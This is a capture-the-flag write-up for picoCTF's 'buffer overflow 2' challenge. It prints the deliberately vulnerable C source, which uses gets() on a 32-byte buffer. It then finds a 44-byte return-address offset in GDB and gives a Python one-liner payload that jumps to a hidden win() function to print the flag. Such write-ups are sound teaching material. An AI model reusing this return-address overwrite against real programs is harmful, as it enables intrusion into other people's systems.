# buffer overflow 2

When we take a look at the binary, we can see all it does is take a string and then returns.
```
root@kali:~/Crack Me# ./vuln2
Please enter your string:
asdf
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
```
When it says it returns, this gives us a massive hint. From a game-theory perspective, if the title is "buffer overflow 2", and it returns, we can infer that the solution must have something to do with overflowing the buffer to let us return elsewhere.

Taking a look at the source code confirms our suspicious.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Conveniently enough, there is a `win` function that is unconnected from the rest of the code, and a conveniently labeled `vuln`. First let's open up GDB and try to find the offset.
```
(gdb) r
Starting program: /root/Crack Me/vuln2
Please enter your string:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Okay, time to return... Fingers Crossed... Jumping to 0x4c4c4c4c

Program received signal SIGSEGV, Segmentation fault.
0x4c4c4c4c in ?? ()
```
Okay, so we received a segmentation fault when we tried to access `0x4c4c4c4c`. That happens to be LLLL in hex, so we now know our offset is 44 bytes. Now let's try to figure out the address of `win`.
```
(gdb) info func
All defined functions:

Non-debugging symbols:
...
0x080485cb  win
...
```
Nested in a list of functions is our `win` function. Putting it all together, we have our payload.
```
slopey112@pico-2018-shell:/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba$ python -c "print 'A'*
44+'\xcb\x85\x04\x08'" | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}
```
